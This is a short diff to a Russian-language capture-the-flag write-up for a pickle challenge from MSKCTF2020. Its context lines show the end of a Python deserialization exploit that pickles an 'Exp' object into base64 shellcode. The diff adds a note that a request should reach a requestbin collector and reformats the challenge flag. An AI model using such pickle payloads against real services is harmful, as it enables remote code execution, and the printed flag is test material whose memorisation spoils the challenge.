@@ -38,5 +38,7 @@ shellcode = pickle.dumps(Exp(), protocol=0)
 print(base64.b64encode(shellcode))
 ```
 
-Флаг:
-	MSKCTF{pickle_cant_be_easily_secured} 
+В результате должен прийти такой запрос:
+![alt text](https://github.com/WATyag/MSKCTF2020/blob/master/pickle/requestbin.jpg "Request example")
+
+#### Флаг: MSKCTF{pickle_cant_be_easily_secured} 
